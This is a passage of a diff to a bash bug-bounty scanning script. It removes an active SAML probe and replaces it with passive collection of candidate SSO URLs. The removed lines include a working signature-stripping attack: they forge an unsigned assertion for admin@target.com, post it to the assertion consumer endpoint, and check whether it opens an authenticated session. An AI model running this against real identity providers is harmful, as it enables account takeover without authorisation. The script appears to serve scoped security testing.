-                         "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
-                         "/.well-known/openid-configuration"; do
-            SAML_URL="${host%/}${SAML_PATH}"
-            SAML_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$SAML_URL" 2>/dev/null || echo "000")
-
-            case "$SAML_CODE" in
-                200|301|302|403)
-                    log_vuln "[SAML] Endpoint found (HTTP $SAML_CODE): $SAML_URL"
-                    echo "[SAML-ENDPOINT] $SAML_URL | HTTP $SAML_CODE" >> "$FINDINGS_DIR/saml/endpoints.txt"
-                    ;;
-            esac
-        done
-    done < <(head -"$SAML_HOST_LIMIT" "$LIVE_URLS")
-
-    # Suppress SPA-fallback false positives before metadata + sig-stripping probes
-    if [ -s "$FINDINGS_DIR/saml/endpoints.txt" ] && [ -s "$SPA_FP" ]; then
-        (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter filter \
-            --findings "$FINDINGS_DIR/saml/endpoints.txt" \
-            --fingerprints "$SPA_FP" \
-            --drop "$FINDINGS_DIR/.tmp/saml_endpoints.suppressed.txt" 2>/dev/null) || true
-    fi
-
-    while IFS= read -r saml_url; do
-        [ -z "$saml_url" ] && continue
-        SAML_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 8 "$saml_url" 2>/dev/null || true)
-
-        if printf '%s\n' "$SAML_RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
-            log_vuln "[SAML] Metadata exposed: $saml_url"
-            echo "[SAML-METADATA-EXPOSED] $saml_url" >> "$FINDINGS_DIR/saml/findings.txt"
-            printf '%s\n' "$SAML_RESP" | grep -o '<X509Certificate>[^<]*' | head -3 >> "$FINDINGS_DIR/saml/certs.txt" 2>/dev/null || true
-        fi
-    done < <(awk '{print $2}' "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null || true)
-
-    ACS_URL=$(grep -E "saml/acs|saml/login" "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | head -1 | awk '{print $2}' || true)
-    if [ -n "$ACS_URL" ]; then
-        STRIPPED_SAML=$(printf '%s' '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
-        SAML_COOKIE_JAR="$FINDINGS_DIR/.tmp/saml_signature.cookies"
-        SAML_POST_BODY="$FINDINGS_DIR/.tmp/saml_signature_post.body"
-        rm -f "$SAML_COOKIE_JAR" "$SAML_POST_BODY"
-        SAML_POST_CODE=$(curl -sk -o "$SAML_POST_BODY" -c "$SAML_COOKIE_JAR" -w "%{http_code}" --max-time 8 \
-            -X POST "$ACS_URL" \
-            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "000")
-
-        if [ "$SAML_POST_CODE" = "200" ] || [ "$SAML_POST_CODE" = "302" ]; then
-            SAML_PROTECTED_URL="${BBHUNT_SAML_PROTECTED_URL:-}"
-            if [ -z "$SAML_PROTECTED_URL" ]; then
-                log_warn "[SAML] ACS accepted the probe, but no protected read-back URL was configured"
-                echo "[SAML-SIG-STRIP-CANDIDATE] $ACS_URL | post=$SAML_POST_CODE | reason=BBHUNT_SAML_PROTECTED_URL required" >> "$SAML_REVIEW_FILE"
-            elif ! PYTHONPATH="$BASE_DIR${PYTHONPATH:+:$PYTHONPATH}" python3 - "$SAML_PROTECTED_URL" "$SCANNER_AUTH_TARGET" <<'PY'
-import sys
-from tools.target_paths import url_belongs_to_target
-
-raise SystemExit(0 if url_belongs_to_target(sys.argv[1], sys.argv[2]) else 1)
-PY
-            then
-                log_warn "[SAML] Protected read-back URL is outside the current target"
-                echo "[SAML-SIG-STRIP-CANDIDATE] $ACS_URL | post=$SAML_POST_CODE | reason=protected URL outside target" >> "$SAML_REVIEW_FILE"
-            else
-                SAML_ANON_BODY="$FINDINGS_DIR/.tmp/saml_signature_anon.body"
-                SAML_READBACK_BODY="$FINDINGS_DIR/.tmp/saml_signature_readback.body"
-                SAML_ANON_CODE=$(curl -sk -o "$SAML_ANON_BODY" -w "%{http_code}" --max-time 8 \
-                    "${BB_ANON_AUTH_ARGS[@]}" "$SAML_PROTECTED_URL" 2>/dev/null || echo "000")
-                SAML_READBACK_CODE=$(curl -sk -o "$SAML_READBACK_BODY" -b "$SAML_COOKIE_JAR" -w "%{http_code}" --max-time 8 \
-                    "$SAML_PROTECTED_URL" 2>/dev/null || echo "000")
-                SAML_COOKIE_ISSUED=0
-                grep -qE '^[^#[:space:]]' "$SAML_COOKIE_JAR" 2>/dev/null && SAML_COOKIE_ISSUED=1
-
-                if [[ "$SAML_ANON_CODE" =~ ^(301|302|303|307|308|401|403)$ ]] \
-                    && [ "$SAML_READBACK_CODE" = "200" ] \
-                    && [ "$SAML_COOKIE_ISSUED" -eq 1 ] \
-                    && [ -s "$SAML_READBACK_BODY" ] \
-                    && ! cmp -s "$SAML_ANON_BODY" "$SAML_READBACK_BODY"; then
-                    log_vuln "[SAML] Signature stripping produced an authenticated protected-resource read-back: $ACS_URL"
-                    echo "[SAML-SIG-STRIP] $ACS_URL | protected=$SAML_PROTECTED_URL | anon=$SAML_ANON_CODE | post=$SAML_POST_CODE | readback=$SAML_READBACK_CODE | cookie=issued" >> "$FINDINGS_DIR/saml/findings.txt"
-                else
-                    log_warn "[SAML] ACS status was not enough to prove an authenticated session: $ACS_URL"
-                    echo "[SAML-SIG-STRIP-CANDIDATE] $ACS_URL | protected=$SAML_PROTECTED_URL | anon=$SAML_ANON_CODE | post=$SAML_POST_CODE | readback=$SAML_READBACK_CODE | cookie=$SAML_COOKIE_ISSUED | reason=protected read-back not proven" >> "$SAML_REVIEW_FILE"
-                fi
-                rm -f "$SAML_ANON_BODY" "$SAML_READBACK_BODY"
-            fi
-        fi
-        rm -f "$SAML_COOKIE_JAR" "$SAML_POST_BODY"
-    fi
-
-    # Suppress SPA-fallback false positives in sig-stripping / metadata findings
-    if [ -s "$FINDINGS_DIR/saml/findings.txt" ] && [ -s "$SPA_FP" ]; then
-        (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter filter \
-            --findings "$FINDINGS_DIR/saml/findings.txt" \
-            --fingerprints "$SPA_FP" \
-            --drop "$FINDINGS_DIR/.tmp/saml_findings.suppressed.txt" 2>/dev/null) || true
-    fi
-
-    SAML_FINDINGS=$(count_findings "$FINDINGS_DIR/saml/findings.txt")
-    [ "$SAML_FINDINGS" -gt 0 ] && log_ok "[SAML] $SAML_FINDINGS finding(s) — review $FINDINGS_DIR/saml/"
+    collect_candidate_urls \
+        "$FINDINGS_DIR/saml/endpoints.txt" \
+        "saml_candidates" \
+        'saml|sso|openid|oidc|relaystate|samlrequest|samlresponse|jwk|jwks' \
+        "$PARAM_URLS" "$PARAM_URLS_RAW" "$API_ENDPOINTS_FILTERED" "$SENSITIVE_PATHS_FILTERED" "$ALL_URLS"
+    SAML_COUNT=$(count_findings "$FINDINGS_DIR/saml/endpoints.txt")
+    [ "$SAML_COUNT" -gt 0 ] \
+        && log_warn "SAML/SSO review candidates: $SAML_COUNT (AI-selected flow validation required)" \
+        || log_done "SAML/SSO candidates: none found"
 else
+    rm -f "$FINDINGS_DIR/saml/endpoints.txt" "$FINDINGS_DIR/saml/findings.txt" "$FINDINGS_DIR/saml/certs.txt"
     log_warn "Skipping SAML checks (--skip)"
-fi
-
-if [ ! -s "$SAML_REVIEW_FILE" ]; then
-    rm -f "$SAML_REVIEW_FILE"
 fi
 
 # ============================================================
@@ -1909,9 +1590,9 @@ fi
     echo "============================================="
     echo "  TOTAL FINDINGS: $TOTAL_FINDINGS"
     echo "============================================="
-    echo "  Verified SQLi PoCs: $(awk '/SQLI-POC-VERIFIED/ { count++ } END { print count + 0 }' "$FINDINGS_DIR/sqli/timebased_candidates.txt" 2>/dev/null || echo 0)"
-    echo "  Verified RCE PoCs: $(count_vuln "$FINDINGS_DIR/upload/verified_rce_pocs.txt")"
-    echo "  SSTI Confirmed: $(count_vuln "$FINDINGS_DIR/ssti/ssti_candidates.txt")"
+    echo "  SQLi review candidates: $(count_vuln "$FINDINGS_DIR/sqli/timebased_candidates.txt")"
+    echo "  Upload review candidates: $(count_vuln "$FINDINGS_DIR/upload/upload_candidates.txt")"
+    echo "  SSTI review candidates: $(count_vuln "$FINDINGS_DIR/ssti/ssti_candidates.txt")"
     echo "  MFA Findings: $(count_vuln "$FINDINGS_DIR/mfa/findings.txt")"
     echo "  SAML Findings: $(count_vuln "$FINDINGS_DIR/saml/findings.txt")"
     echo ""
